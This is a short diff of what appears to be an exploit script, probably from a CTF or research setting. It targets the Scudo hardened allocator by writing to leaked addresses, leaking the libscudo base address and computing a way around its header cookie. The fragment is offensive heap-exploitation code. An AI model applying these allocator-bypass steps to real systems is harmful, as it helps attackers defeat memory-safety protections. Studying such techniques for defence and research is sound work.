@@ -50,7 +50,7 @@ info(f"address 1: {hex(add1)} address 2: {hex(add2)}")
 write(io, add1, b"X"*12)
 write(io, add2, b"Y"*12)
 
-scudo_base = get_libscudo_base(io)
+scudo_base = get_libscudo_base(io, SCUDO_LIB)
 info(f"lib-scudo base: {hex(scudo_base)}")
 
 cookie_cheat = get_cookie_cheat(io, scudo_base)
